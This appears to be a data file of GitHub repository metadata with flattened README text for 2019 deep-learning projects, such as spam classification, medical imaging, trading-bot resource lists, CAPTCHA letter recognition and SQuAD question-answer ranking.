challakarthik9,Deep-learning-technique-to-classify-text-data-,n/a,Deep learning technique to classify text data classifying the text data based on two parameters as spam and ham using Deep learning Techniques work flow will be like 1 importing necessary modules 2 reading the data 3 Check the labels and their frequencies 4 Converting unstructured text to structured numeric form This includes Tokenizing Converting sequence of words to sequence of word indeces Converting varing length sequences to fixed length sequences through padding 5 Prepare the target vectors for the network 6 Building and training an LSTM model 7 Prediction and evaluation on test data alt text http https www google com url sa i source images cd ved 2ahUKEwinvayttITjAhVFknAKHfv1CVMQjRx6BAgBEAU url https 3A 2F 2Fwww datacamp com 2Fcommunity 2Ftutorials 2Fdeep learning python psig AOvVaw1zpahyv4Q4RuSJyOkJQ8jS ust 1561544352561033 to img png,2019-06-25T10:12:13Z,2019-06-25T10:23:42Z,Jupyter Notebook,challakarthik9,User,0,1,0,10,master,challakarthik9,1,0,0,0,0,0,0
LeadingIndiaAI,Aerial-Cactus-Identification-using-Deep-Learning-,n/a,Aerial Cactus Identification Summer Internship Project Leading India ai Bennett University,2019-06-27T07:18:21Z,2019-06-28T16:14:58Z,Jupyter Notebook,LeadingIndiaAI,User,0,1,0,8,master,umangjpatel,1,0,0,0,0,0,0
rohan-dhere,early-detection-of-blindness-using-deep-learning,n/a,Early detection of blindnes using deep learning Brief Summary Millions of people suffer from diabetic retinopathy the leading cause of blindness among working aged adults This is machine learning model to speed up disease detection at early stages Large set of retina images taken using fundus photography under a variety of imaging conditions Diabetic retinopathy on a scale of 0 to 4 0 No DR 1 Mild 2 Moderate 3 Severe 4 Proliferative Dataset kaggle competitions download c aptos2019 blindness detection Sample image sampleimage 981188351 png Augmented Images sampleimage 104 png sampleimage 112949469 png Link to our project video https youtu be Q0kTO78hic Convolution layer This layer applies the convolution operation on an image with a defined stride and padding Pooling layer This layer is used for reducing the dimensionality of feature maps by defining a mask and an operation to be p performed then moving the mask on the whole image according to the stride defined No weights are learnt in this layer Fully Connected layer Traditional neural layers used at the end stem of the neural network Used rarely these days due to the staggering amount of parameters it uses Dropout layer Used for reducing over fitting It randomly turns off some neurons at each pass during the training Batch Normalisation Normalises the output values thus reducing computation time Also introduces regularisation effect,2019-07-17T11:54:52Z,2019-07-18T09:57:45Z,Python,rohan-dhere,User,0,1,0,19,master,rohan-dhere,1,0,0,0,0,0,0
jmvines20,georgezouq-awesome-deep-reinforcement-learning-in-finance,n/a,DL RL SL Strategies Research Tools in Quantitative Finance Awesome DL RL SL in Quantitative Finance The main goal is collect those AI RL DL SL Evoluation Genetic Algorithm used in financial market otherwise we add Technology Analysis Alpha Research Arbitrage and other useful strategies tools docs in quantitative finance market We collect all market include traditional market like stock futures currencies and crypto currency markets Awesome https awesome re badge svg https awesome re Papers papers Courses courses Strategies strategies research Trading System trading system back test live trading Research tools research tools Data Sources data sources Tutorials Docs tutorials Exchange API Docs ai framework Other Tools others Papers THE THEORY OF SPECULATION L BACHELIER 1900 http www radio goldseek com bachelier thesis theory of speculation en pdf The influences which determine the movements of the Stock Exchange are Brownian Motion in the Stock Market Osborne 1959 http m e m h org Osbo59 pdf innumerable Events past present or even anticipated often showing no apparent A Deep Reinforcement Learning Framework for the Financial Portfolio Management Problem https arxiv org pdf 1706 10059 pdf Reinforcement Learning for Trading 1994 http papers nips cc paper 1551 reinforcement learning for trading pdf Dragon Kings Black Swans and the Prediction of Crises Didier Sornette https arxiv org pdf 0907 4290 pdf We develop the concept of dragon kings corresponding to meaningful outliers which are found to coexist with power laws in the distributions of event sizes under a broad range of conditions in a large variety of systems Courses Overview of Advanced Methods of Reinforcement Learning in Finance https www coursera org learn advanced methods reinforcement learning finance home welcome Strategies Research AI Traditional Markets trump2cash https github com maxbbraun trump2cash A stock trading bot powered by Trump tweets http trump2cash biz Personae https github com Ceruleanacg Personae Personae is a repo of implements and environment of Deep Reinforcement Learning Supervised Learning for Quantitative Trading Quantitative Trading https github com Ceruleanacg Quantitative Trading Papers and Code Implements for Quantitative Trading gym trading https github com hackthemarket gym trading Environment for reinforcement learning algorithmic trading models zenbrain https github com carlos8f zenbrain A framework for machine learning bots DeepLearningNotes https github com AlphaSmartDog DeepLearningNotes Machine Learning in Quant analysis Portfolio Management qtrader https github com filangel qtrader Reinforcement Learning for Portfolio Management PGPortfolio https github com ZhengyaoJiang PGPortfolio PGPortfolio Policy Gradient Portfolio the source code of A Deep Reinforcement Learning Framework for the Financial Portfolio Management Problem High Frequency Trading HFT SGX Full OrderBook Tick Data Trading Strategy https github com rorysroes SGX Full OrderBook Tick Data Trading Strategy Providing the solutions for high frequency trading HFT strategies using data science approaches Machine Learning on Full Orderbook Tick Data HFTBitcoin https github com ghgr HFTBitcoin Analysis of High Frequency Trading on Bitcoin exchanges Crypto Currencies LSTM Crypto Price Prediction https github com SC4RECOIN LSTM Crypto Price Prediction Predicting price trends in cryptomarkets using an lstm RNN for the use of a trading bot tforcebtctrader https github com lefnire tforcebtctrader TensorForce Bitcoin Trading Bot Tensorflow NeuroEvolution Trading Bot https github com SC4RECOIN Tensorflow NeuroEvolution Trading Bot Using tensorflow to build a population of models that trade cyrpto and breed and mutate iteratively gekkoga https github com gekkowarez gekkoga Genetic Algorithm for solving optimization of trading strategies using Gekko GekkoANNStrategies https github com markchen8717 GekkoANNStrategies ANN trading strategies for the Gekko trading bot gekko neuralnet https github com zschro gekko neuralnet Neural network strategy for Gekko bitcoinprediction https github com llSourcell bitcoinprediction This is the code for Bitcoin Prediction by Siraj Raval on Youtube TA Gekko Bot Resources https github com cloggy45 Gekko Bot Resources Gekko bot resources gekkotools https github com tommiehansen gekkotools Gekko strategies tools etc gekko RSIWR https github com zzmike76 gekko Gekko RSIWR strategies gekko HL https github com mounirlabaied gekko strat hl calculate down peak and trade on EthTradingAlgorithm https github com Philipid3s EthTradingAlgorithm Ethereum trading algorithm using Python 3 5 and the library ZipLine gekkotradingstuff https github com thegamecat gekko trading stuff A dumping ground for my files I use with this awesome crypto currency trading platform forex analytics https github com mkmarek forex analytics Node js native library performing technical analysis over an OHLC dataset with use of genetic algorithm BitcoinMACDStrategy https github com VermeirJellen BitcoinMACDStrategy Bitcoin MACD Crossover Trading Strategy Backtest crypto signal https github com CryptoSignal crypto signal Automated Crypto Trading Technical Analysis TA Bot for Bittrex Binance GDAX and more 250 coins Gekko Strategies https github com xFFFFF Gekko Strategies Strategies to Gekko trading bot with backtests results and some useful tools gekko gannswing https github com johndoe75 gekko gannswing Gann s Swing trade strategy for Gekko trade bot Lottery Gamble LotteryPredict https github com chengstone LotteryPredict Use LSTM to predict lottery Arbitrage ArbitrageBot https github com BatuhanUsluel ArbitrageBot Arbitrage bot that currently works on bittrex poloniex r2 https github com bitrinjani r2 R2 Bitcoin Arbitrager is an automatic arbitrage trading system powered by Node js TypeScript cryptocurrency arbitrage https github com manu354 cryptocurrency arbitrage A cryptocurrency arbitrage opportunity calculator Over 800 currencies and 50 markets https cryptoworks co bitcoin arbitrage https github com maxme bitcoin arbitrage Bitcoin arbitrage opportunity detector blackbird https github com butor blackbird Blackbird Bitcoin Arbitrage a long short market neutral strategy Data Sources Traditional Markets Tushare Crypto Currencies CryptoInscriber https github com Optixal CryptoInscriber A live cryptocurrency historical trade data blotter Download live historical trade data from any cryptoexchange be it for machine learning backtesting visualizing trading strategies or for Quantopian Zipline Gekko Datasets https github com xFFFFF Gekko Datasets Gekko Trading Bot dataset dumps Ready to use and download history files in SQLite format Research Tools JAQS https github com quantOS org JAQS An open source quant strategies research platform pyfolio https github com quantopian pyfolio Portfolio and risk analytics in Python https quantopian github io pyfolio alphalens https github com quantopian alphalens Performance analysis of predictive alpha stock factors http quantopian github io alphalens empyrical https github com quantopian empyrical Common financial risk and performance metrics Used by zipline and pyfolio http quantopian github io empyrical deprecated fooltrader https github com foolcage fooltrader Trade as a fool zvt https github com zvtvz zvt zero vector trader which base on fooltrader Trading System Back Test Live trading Traditional Market System zipline https github com quantopian zipline Zipline a Pythonic Algorithmic Trading Library http www zipline io rqalpha https github com ricequant rqalpha A extendable replaceable Python algorithmic backtest trading framework supporting multiple securities http rqalpha io backtrader https github com backtrader backtrader Python Backtesting library for trading strategies https www backtrader com kungfu https github com taurusai kungfu Kungfu Master Trading System Combine Rebuild pylivetrader https github com alpacahq pylivetrader Python live trade execution library with zipline interface CoinMarketCapBacktesting https github com JimmyWuMadchester CoinMarketCapBacktesting This project tests bt http pmorissette github io bt and Quantopian Zipline https github com quantopian zipline as backtesting frameworks for coin trading strategy Crypto Currencies gekko https github com askmike gekko A bitcoin trading bot written in node https gekko wizb it zenbot https github com DeviaVir zenbot Zenbot is a command line cryptocurrency trading bot using Node js and MongoDB bot18 https github com carlos8f bot18 Bot18 is a high frequency cryptocurrency trading bot developed by Zenbot creator carlos8f https bot18 net magic8bot https github com magic8bot magic8bot Magic8bot is a cryptocurrency trading bot using Node js and MongoDB catalyst https github com enigmampc catalyst An Algorithmic Trading Library for Crypto Assets in Python http enigma co QuantResearchDev https github com mounirlabaied QuantResearchDev Quant Research dev Traders open source project BUILDING MACD https github com sudoscripter MACD Zenbot Macd Auto Trader abu https github com bbfamily abu A quant trading system base on python http www abuquant com Plugins easytrader https github com shidenggui easytrader joinquant ricequant CoinMarketCapBacktesting https github com JimmyWuMadchester CoinMarketCapBacktesting This project tests bt http pmorissette github io bt and Quantopian Zipline https github com quantopian zipline as backtesting frameworks for coin trading strategy Gekko BacktestTool https github com xFFFFF Gekko BacktestTool Batch backtest import and strategy params optimalization for Gekko Trading Bot With one command you will run any number of backtests TA Technical Analysis Lib pandastalib https github com femtotrader pandastalib A Python Pandas implementation of technical analysis indicators finta https github com peerchemist finta Common financial technical indicators implemented in Python Pandas 70 indicators tulipnode https github com TulipCharts tulipnode Tulip Node is the official node js wrapper for Tulip Indicators It provides over 100 technical analysis overlay and indicator functions https tulipindicators org techan js https github com andredumas techan js A visual technical analysis and charting Candlestick OHLC indicators library built on D3 http techanjs org Exchange API HuobiFeeder https github com mmmaaaggg HuobiFeeder Connect HUOBIPRO exchange get market historical data for ABAT trading platform backtest analysis and live trading ctpwrapper https github com nooperpudd ctpwrapper Shanghai future exchange CTP api Tutorials ML Reinforcement learning with tensorflow https github com MorvanZhou Reinforcement learning with tensorflow Simple Reinforcement learning tutorials AlgorithmInterviewNotes Chinese https github com imhuay AlgorithmInterviewNotes Chinese Algorithm Interview Notes Chinese Learning Notes https github com Ceruleanacg Learning Notes Repo of learning notes in DRL and DL theory codes models and notes maybe Deep Learning World https github com astorfi Deep Learning World Organized Resources for Deep Learning Researchers and Developers 100 Days Of ML Code https github com Avik Jain 100 Days Of ML Code 100 Days of ML Coding Quant AI Framework convnetjs https github com karpathy convnetjs Deep Learning in Javascript Train Convolutional Neural Networks or ordinary ones in your browser TensorForce https github com reinforceio tensorforce TensorForce A TensorFlow library for applied reinforcement learning gym https github com openai gym A toolkit for developing and comparing reinforcement learning algorithms https gym openai com Pavlov js https github com NathanEpstein Pavlov js Reinforcement learning using Markov Decision Processes For JS written in C baselines https github com openai baselines OpenAI Baselines high quality implementations of reinforcement learning algorithms prophet https github com facebook prophet Tool for producing high quality forecasts for time series data that has multiple seasonality with linear or non linear growth Visualizing playground https github com tensorflow playground Play with neural networks http playground tensorflow org netron https github com lutzroeder netron Visualizer for deep learning and machine learning models https www lutzroeder com ai Articles The Economist https github com nailperry zd The Economist The Economist nyu mlif notes https github com wizardforcel nyu mlif notes NYU machine learning in finance notes Using LSTMs to Turn Feelings Into Trades https www quantopian com posts watch our webinar buying happiness using lstms to turn feelings into trades now utmsource forum utmmedium twitter utmcampaign sentiment analysis Chinese Maury Osborne https zhuanlan zhihu com p 20586843 Black Scholes https zhuanlan zhihu com p 32664487 Black Scholes https zhuanlan zhihu com p 32746192 https www ricequant com community topic 62 E8 B6 8B E5 8A BF E7 AD 96 E7 95 A5 E5 B0 8F E8 AF 95 E7 89 9B E5 88 80 E6 B5 B7 E9 BE 9F E4 BA A4 E6 98 93 E4 BD 93 E7 B3 BB E7 9A 84 E6 9E 84 E5 BB BA Others zipline tensorboard https github com jimgoo zipline tensorboard TensorBoard as a Zipline dashboard http jimgoo com tensorboard and zip gekko quasar ui https github com H256 gekko quasar ui An UI port for gekko trading bot using Quasar framework Other Resource awesome quant https github com wilsonfreitas awesome quant A curated list of insanely awesome libraries packages and resources for Quants Quantitative Finance awesome quant china https github com thuquant awesome quant Quant resource in china awesome rl https github com aikorea awesome rl,2019-08-05T17:49:58Z,2019-09-01T19:47:53Z,n/a,jmvines20,User,1,1,1,15,master,georgezouq#peerchemist#AL1L,3,0,0,0,0,0,0
tejahpc,Biowulf_DLintro,n/a,Biowulf Deep Learning Intro Deep learning examples based on Laurence Moroney s excellent Coursera course which introduces deep learning in a concise practical manner The jupyter notebooks are self explainatory and will guide you through samples of deep learning codes Pytorch examples Work in Progress are designed to match the Tensorflow examples Some examples are also extended and modified to be run on Biowulf Getting Started After logging in to Biowulf allocate an sinteractive session with the tunnel option https hpc nih gov apps jupyter html sinteractive gres gpu k80 1 lscratch 10 mem 20g c8 tunnel module load python 3 6 git clone https github com tejahpc BiowulfDLintro git cd BiowulfDLintro jupyter notebook ip localhost port PORT1 no browser On a second terminal create the ssh tunnel with the command given after the sinteractive session is allocated e g ssh L 33327 localhost 33327 biowulf nih gov,2019-07-03T15:56:58Z,2019-12-13T13:44:39Z,Jupyter Notebook,tejahpc,User,0,1,0,6,master,tejahpc,1,0,0,0,0,0,0
PolinaKnutsson,Deep-Learning-a-simple-application-of-Keras,n/a,Deep Learning a simple application of Keras This notebook is an example of how the neural network library Keras can be applied to prediction I use data on wine characteristics can be downloaded here https www kaggle com uciml red wine quality cortez et al 2009 where the target variable is wine quality,2019-07-23T11:39:17Z,2019-08-13T18:42:48Z,Jupyter Notebook,PolinaKnutsson,User,1,1,0,2,master,PolinaKnutsson,1,0,0,0,0,0,0
kellylab,Metagenomic-Disease-Classification-With-Deep-Learning,n/a,Metagenomic Disease Classification With Deep Learning This repository accompanies the paper Multiclass Disease Classification from Microbial Whole CommunityMetagenomes using Graph Convolutional Neural Networks,2019-08-06T05:00:28Z,2019-10-07T06:34:11Z,Python,kellylab,Organization,4,1,1,2,master,smk508,1,0,0,0,0,0,0
Soumitra-Mandal,FashionMNIST,n/a,,2019-07-17T03:54:57Z,2019-08-14T13:32:16Z,Jupyter Notebook,Soumitra-Mandal,User,0,1,1,2,master,Soumitra-Mandal,1,0,0,0,0,0,0
bigmao8576,Learn-the-basic-ideas-of-deep-learning,n/a,Learn the basic ideas of deep learning All the files in this repo are used for learning and have nothing to do with my projects if I want to obtain all the variables in tf n name for n in tf getdefaultgraph asgraphdef node keep the python version locally eval pyenv init What I need to learn 1 TF record 2 Not have a clear idea now,2019-07-28T22:42:17Z,2019-09-11T17:26:26Z,Python,bigmao8576,User,1,1,0,9,master,bigmao8576,1,0,0,0,0,0,0
SalemAmeen,codepaper,n/a,codepaper,2019-06-28T10:13:22Z,2019-06-28T10:18:12Z,Jupyter Notebook,SalemAmeen,User,0,1,0,2,master,SalemAmeen,1,0,0,0,0,0,0
ArnabMallik,TwitterDataSentimentAnalysis,n/a,TwitterDataSentimentAnalysis Binary Classifier using Deep Learning https www kaggle com c twitter sentiment analysis2 Download Glove Twitter Seed from https nlp stanford edu projects glove use 200 length vector,2019-07-18T11:40:00Z,2019-09-11T00:08:31Z,Python,ArnabMallik,User,0,1,0,6,master,ArnabMallik,1,0,0,0,0,0,0
asimoya99,TeddyBear-Classifier,n/a,TeddyBear Classifier Deep Learning Teddy Bear Classifier,2019-07-04T04:01:19Z,2019-10-27T02:05:58Z,Python,asimoya99,User,0,1,0,2,master,asimoya99,1,0,0,0,0,0,0
IBM,image-preprocessing-for-deep-learning-models,n/a,Multi Class Image Classification of Yoga postures using Watson Studio and Deep Learning as a Service Computer vision usability is on the rise these days and there could be scenarios where a machine has to classify images based on their class to aid the decision making process In this tutorial we will demonstrate a methodology to do preprocessing of the images to remove unnecessary information and help the model to learn the features of the images effectively thereby enhancing the accuracy THis tutorial has to be used in conjunction with the code pattern listed towards the end to experiment different steps in preprocessing and their impact on the outcome which is prediction accuracy of image classification Introduction The purpose of this tutorial is to discuss a few methods to preprocess the images before it is ingested into model building process This includes resizing the images creating the pixel arrays of images and pickling the data removing background noise from the images et al Prerequisites Users are expected to be aware of Python computer vision deep learning and IBM cloud environment services Estimated time It should take about 45 mins to an hour to complete the tutorial Steps Resizing the images This is an important step where the images are standardized and resized to a specific shape which is usually 224 224 Images come in different shapes and to help the model learn better it is necessary to resize it to avoid extra padding of the images The pre trained models also require the images to be resized before they are ingested into the models https github com IBM image preprocessing for deep learning models blob master doc source images resizeimage png Pickle the data In this step we will discuss how and why do we need to pickle the images data The primary reason is to convert the images from jpeg png format into a pixel array which will have inputs and targets defined This array of numbers will help any model machine learning deep learning pretrained to learn the features and understand the pattern well of any given class which will enhance the accuracy of the model We will see in below steps how to create a pixel array and write it into a pickle file First step https github com IBM image preprocessing for deep learning models blob master doc source images createtxt png Next Step https github com IBM image preprocessing for deep learning models blob master doc source images extractdata png Subsequent Steps https github com IBM image preprocessing for deep learning models blob master doc source images createpklfile1 png https github com IBM image preprocessing for deep learning models blob master doc source images createpklfile2 png From the screenshots we are able to define the input target parameters using a text file convert the raw image data into pixel array and then dump them into a pickle file which will be consumed by deep learning models This step is mandatory for deep learning frameworks like Tensorflow or Keras and for creating deep learning experiments using hyper parameters optimization in Watson Machine Learning Repeat this process thrice for creating training testing validation pickle files Another point to be noted is that all images are to be of same size in order to pickle the data which is why the resizing of images has to be done first before pickling the data Create test data json This step is needed if we have to provide the test data in json format for the model to get predictions Watson Machine Learning requires the input data to be in json format for realtime scoring The below code snippet will read the pickle file split it into input tagret and then writes it to a json file https github com IBM image preprocessing for deep learning models blob master doc source images createjson png Remove background noise This step is to enhance accuracy by removing the background of an image An image consists of features and if the goal is to identify a person or an object then we can try to remove all other features apart from the one in question An example is given below with code snippet where we try to identify the posture of the person and we are removing most of the other features which are not relevant https github com IBM image preprocessing for deep learning models blob master doc source images rmvbckgnd1 png https github com IBM image preprocessing for deep learning models blob master doc source images rmvbckgnd2 png https github com IBM image preprocessing for deep learning models blob master doc source images removebckgrnd png Some of the other methods to remove background are as follows Watershed Method Grabcut Method Background Subtractor There are additional resources available on exploration to understand more about background removal Summary We have discussed a few steps which are part of image preprocessing and these steps can help to a good extent with regards to preprocessing the images also enhances the model accuracy We have to play around with these parameters and also add new parameters if required to get the desired output This is not an exhaustive list but will definitely help in getting started Related links The implementation of deep learning methodology for image classification is available at the below url Please explore the above mentioned steps and see how the performance of the model improves with preprocessing the images View the code demo and more at https github com IBM create a predictive system for image classification using deep learning as a service,2019-07-09T18:27:09Z,2019-10-08T19:26:40Z,Jupyter Notebook,IBM,Organization,5,1,1,61,master,RK-Sharath#stevemar,2,0,0,1,0,0,0
Sabyasachi123276,Malaria-Detection-With-Various-Deep-Learning-Architecture,n/a,,2019-07-21T23:26:00Z,2019-08-07T21:41:50Z,Python,Sabyasachi123276,User,0,1,0,4,master,Sabyasachi123276,1,0,0,0,0,0,0
MFDemirel,Forecasting-Turkish-Stock-Markets-Using-Deep-Learning,n/a,,2019-06-24T08:56:12Z,2019-07-11T12:49:38Z,Jupyter Notebook,MFDemirel,User,0,1,0,1,master,MFDemirel,1,0,0,0,0,0,0
joneshshrestha,CaptchaRecognition,captcha-breaking#keras#machine-learning#opencv#python#tensorflow,To run these scripts you need the following installed 1 Python 3 2 OpenCV 3 w Python extensions I highly recommend these OpenCV installation guides https www pyimagesearch com opencv tutorials resources guides 3 The python libraries listed in requirements txt Try running pip3 install r requirements txt Step 1 Extract single letters from CAPTCHA images The results is stored in the extractedletterimages folder Step 2 Train the neural network to recognize single letters This will write out captchamodel hdf5 and modellabels dat Step 3 Use the model to solve CAPTCHAs Run python3 solvecaptchaswithmodel py,2019-07-10T10:24:56Z,2019-08-03T15:14:47Z,Python,joneshshrestha,User,0,1,0,12,master,joneshshrestha,1,0,0,0,0,0,0
amiratag,EchoNet,n/a,EchoNet Deep Learning Interpretation of Echocardiograms Model checkpoints for all tasks could be downloaded from here https drive google com open id 1lIM7xT7An18rANlnDAKQ QYyns5ZmBkF,2019-06-25T00:46:05Z,2019-10-23T23:19:09Z,n/a,amiratag,User,0,1,0,3,master,amiratag,1,0,0,0,0,0,0
VinayarajPoliyapram,DeeplearningClassficationLandsat-tImages,n/a,DeeplearningClassficationLandsat 8Images Deep Learning Model For Water Ice Land Classification Using Large Scale Medium Resolution Landsat Satellite Images Water Ice Land region classification is an important remote sensing tasks which analyze the occurrence of water ice on the earth surface Common remote sensing practices such as thresholding spectral analysis and statistical approaches generally do not produce globally reliable classification results Even the robust deep learning models do not perform enough due to the limitation of ground truth available for training and the medium resolution of the Open satellite images Therefore in this research we used a relatively easy method to generate ground truth for randomly selected locations around the globe Then we utilized a simplified variant of well known UNet deep convolutional neural network CNN structure with a dilated CNN layers skip connections and without any max pooling layers The proposed model shows better performance in medium resolution satellite images Landsat 8 compared to state of the art models such as UNet and DeepWaterMap applied on the same task Citation P Vinayaraj N Immoglue R Nakamura Deep learning model for water ice land classification using largescale medium resolution satellite images IEEE GRSS International Geoscience and Remote Sensing Symposium IGARSS 2019 Yokohama Japan Notes 1 An example dataset is given in the data folder with Landsat meta data file 2 list of the Landsat 8 images can be given as predlist txt 3 Six bands are used for classification Blue Green Red NIR SWIR1 SWIR2 4 Trained model weights at 90 epoch were used for prediction one line command for prediction generates numpy array of classification python Predict py,2019-07-26T10:02:02Z,2019-10-10T07:10:34Z,Python,VinayarajPoliyapram,User,0,1,0,32,master,VinayarajPoliyapram,1,0,0,0,0,0,0
agusmontero,eci-2019,n/a,Introduction to Deep Learning ECI 2019 Slides http agusmontero github io eci 2019 This work is licensed under a Creative Commons Attribution 4 0 International License,2019-07-18T18:23:10Z,2019-07-28T19:03:34Z,JavaScript,agusmontero,User,0,1,0,5,master,agusmontero,1,0,0,0,0,0,0
GooooM,Deeplearning,n/a,,2019-08-02T08:07:51Z,2019-08-12T09:13:40Z,Python,GooooM,User,1,1,0,22,master,GooooM,1,0,0,0,0,0,0
abhibhatia,Deep-Q-learner-for-Cart-Pole,n/a,Deep Q learner for Cart Pole Designing a deep q learning agent for cartpole game using Reinforcement Learning,2019-08-05T14:28:56Z,2019-10-20T13:09:33Z,Jupyter Notebook,abhibhatia,User,1,1,0,3,master,abhibhatia,1,0,0,0,0,0,0
plandes,deep-qa-rank,n/a,Deep learning implementation of question answer for information retrieval This is a deep learning implementation of question answer for information retrieval the Severyn et al paper Learning to Rank Short Text Pairs with Convolutional Deep Neural Networks Important for those interested in building on this source please see the derived works derived works section Table of Contents Problem Definition problem definition Example Input and Output example input and output Corpus corpus Corpus Statistics corpus statistics Evaluation evaluation Model model Features features Configuration configuration Changes changes Latent Semantic Analysis Baseline latent semantic analysis baseline Installing installing Usage usage Quick Start quick start Iterative Method for Results iterative method for results Results results Baseline baseline Neural Net Method neural net method Changelog changelog License license Problem Definition This implementation ranks a paragraph for a given user question Many question answer QA systems use a multi level classifier to narrow down to an answer as classified by a text span in the original document The model given in this implementation provides that first course level classification A subsequent component of a pipeline would then later classify the text span providing the answer to the user An example of this later pipeline component is to use the BERT model Example Input and Output Example from the trained model Question How many ministries of the Scottish government does a committee typically correspond to Paragraph classified with rank 0 and probability 97 7 correct paragraph Subject Committees are established at the beginning of each parliamentary session and again the members on each committee reflect the balance of parties across Parliament Typically each committee corresponds with one or more of the departments or ministries of the Scottish Government The current Subject Committees in the fourth Session are Economy Energy and Tourism Education and Culture Health and Sport Justice Local Government and Regeneration Rural Affairs Climate Change and Environment Welfare Reform and Infrastructure and Capital Investment Paragraph classified with rank 1 and probability 96 1 incorrect paragraph The debating chamber of the Scottish Parliament has seating arranged in a hemicycle which reflects the desire to encourage consensus amongst elected members There are 131 seats in the debating chamber Of the total 131 seats 129 are occupied by the Parliament s elected MSPs and 2 are seats for the Scottish Law Officers the Lord Advocate and the Solicitor General for Scotland who are not elected members of the Parliament but are members of the Scottish Government As such the Law Officers may attend and speak in the plenary meetings of the Parliament but as they are not elected MSPs cannot vote Members are able to sit anywhere in the debating chamber but typically sit in their party groupings The First Minister Scottish cabinet ministers and Law officers sit in the front row in the middle section of the chamber The largest party in the Parliament sits in the middle of the semicircle with opposing parties on either side The Presiding Officer parliamentary clerks and officials sit opposite members at the front of the debating chamber For this example the correct paragraph is ranked first Had the two paragraphs been switched it would have a rank of 1 Read here https en wikipedia org wiki Ranking informationretrieval for more information on ranking Corpus This uses the 1 1 version of the SQuAD corpus Note that the paper uses a different corpus which explains the different but not dissimilar results The corpus was created from Wikipedia articles and annotated with questions on a per paragraph basis with text spans including the answer Given this project attempts only to classify a paragraph for a query the answer annotations are not used While not explicitly explained in the paper it is assumed for this implementation that the problem is framed as a binary classification For this reason this model also uses a binary classification on a question belonging to a paragraph More specifically the model says yes when it thinks a particular paragraph P answers a question Q for all question answer pairs in the data set The data set is generated with a somewhat even number of positive to negative examples The positive examples are created by pairing all questions with their respective paragraph from the corpus Negative examples are created by pairing paragraphs with questions from other paragraphs at random without replacement More specifically a paragraph Pi that that contains the answer for question Qj for all i and j where i j These examples create triples in the form python paragraph question Corpus Statistics The SQuAD v1 1 corpus has the following paragraphs and questions Data Set Articles Paragraphs Questions Train 442 18 896 87 599 Test dev 42 2 067 10 570 Totals 484 20 963 98 169 The synthesized corpus used for this implementation has the following composition Data Set Positive Negative Train 87 599 75 584 Test dev 10 570 10 335 Totals 163 183 20 905 The positive and negative aren t evenly stratified because the number of negative questions are estimated a priori in terms of paragraphs A future work is to make these numbers more even using an iterative method Evaluation The data set described in the corpus corpus used to train the network using 20 of the training set as a validation The dev data set was used as a hold out testing set on the trained model again with a near even positive and negative strata Model The model implements something very similar to the papar with a few exceptions changes It uses the deep learning neural network architecture pictured below Architecture doc arch png Network Architecture Features The set of features were taken from word2vec word vectors and the output of SpaCy The word vectors were used as the input layer and used zero vectors for out of vocabulary words Each token of the paragraph and question add the dimension 300 of the word vector with 0 padding for out of vocabulary words The width of the input layer is the sum of the maximum number of tokens all paragraphs and questions Zero padding is also used for utterances with token counts less than the max The maximum token count for paragraphs is 566 and questions were 34 These counts were taken across both training and development data sets Configuration All parsing training and testing parameters and configuration are stored in the configuration file The documentation for each parameter is given as comments in that file Changes This implementation follows the paper pretty closely However it differs in the following ways This work used the SQuAD corpus instead of the TREC QA data set from Wang et al It uses 70 instead of 100 convolution filters for each question and paragraph each Adding additional filters past 20 did not change the performance with any statistical significance This is configurable in the nnmodel section of the configuration file Additional SpaCy features in the input layer were used which included POS tag Named entity from the SpaCy named entity recognizer NER This is configurable in the corpustokennormalizer in the configuration file Number of shared named entity as a count is used in the common shared layer The Google pre trained word2vec word vectors were used where as Severyn et al trained their own Latent Semantic Analysis Baseline A baseline was also computed using Latent Semantic Analysis LSA and K Nearest Neighbor as a non supervised learning task LSA is an older method and fundamentally different but it helps to put the results in perspective The training set paragraphs were used to train the model which for LSA meaning to use Singular Value Decomposition SVD and then reduce dimensionality for the low rank approximation The dimensionality used was 200 see the configuration file Across the 18 896 paragraphs used to train the model 87 599 questions were ranked Again given the nature of unsupervised training the paragraphs only from the training set are used for training to keep at the same level of training data for neural model Installing You need to install the following first Python 3 6 https www python org downloads release python 369 CUDA 9 https developer nvidia com cuda 92 download archive GNU Make https www gnu org software make GNU make is not a must but everything is automated with make so adding it will make your life easier If you decide not to follow the flow of the makefile as duplicate instructions aren t given Usage The project was written to repeat steps for consistent results and easily test hyper parameter tuning and natural language parsing configurations Quick Start For the brave you can do all steps with make all Chances are given the fickle nature of Python environments something will fail but you might get lucky Iterative Method for Results Otherwise do the following and plan to make coffee 1 Install Python virtualenv pip3 install virtualenv 2 Start with a clean slate if rebuilding make vaporize 3 Create a Python 3 6 virtual environment make virtualenv Note a virtual environment isn t necessary but it is recommended Otherwise comment out the PYTHONBIN line in the makefile to use the system default 4 Download and parse the corpus make parse This downloads the SQuAD corpus the first time if not found to data corpora squad Once the corpus is downloaded it is parsed with SpaCy and stored as binary Python pickled files in data proc 4 Extract and store features from the SpaCy parse make features This creates features from the parsed data in a fast consumable format for the training phase 5 Train the model make train This trains the neural network and quits using early stopping when the validation loss increases 6 Test the model make test This tests the network by computing an accuracy on rank 0 across the test set which is the SQuAD dev data set 7 Compute the rankings make calcrank This stores the rank of each question across all paragraphs of the data set which takes a very long time Each ranking with all predictions with question paragraph IDs are stored on disk 7 Compute the mean reciprocal rank of the SQuAD dev data set make calcmrr This uses the ranking results from the previous step to compute the MRR score 8 Compute the same metrics for the baseline make lsammr Note that each step creates it s respective log file which is dumped to the log directory Results All results were tested on the same set of features created by SpaCy as mentioned in the features features section Baseline As described in the LSA Baseline lsa baseline section the training and evaluation were over 87 5K questions trained from 18 9K paragraphs The mean reciprocal rank was 0 1902 meaning the the correct paragraph was ranked as the 5 2567 most probable average The rank standard deviation was 0 3258 Neural Net Method As described in the evaluation evaluation section the trained model was used to rank 10 570 question across 2 067 paragraphs A mean reciprocal rank of 0 7088 was achieved with a standard deviation or 0 392 Again taking the reciprocal one can think of the correct paragraph as ranked as the 1 411 most probable classification It ranks the correct paragraph with rank 0 for the given test data set question answer pairing with an overall accuracy of 96 The paper trained and tested on the TREC QA data set achieves an improved score of 0 8078 The data set and other differences changes might explain why these results differ My guess is that it has a lot to do with the corpus over which the word vectors were trained Further error analysis and testing on the TREC data set might provide answer to this question However this work was an exercise and not an academic paper Perhaps someone else can run this project on the TREC corpus If you do submit a pull request and I ll fold in your code and give you credit for your work TREC QA Data Set The paper cites the corpus they used in their experiments from the Wang et al What is the jeopardy model a quasi synchronous grammar for qa https www aclweb org anthology D07 1003 paper The data set can be downloaded here http cs stanford edu people mengqiu data qg 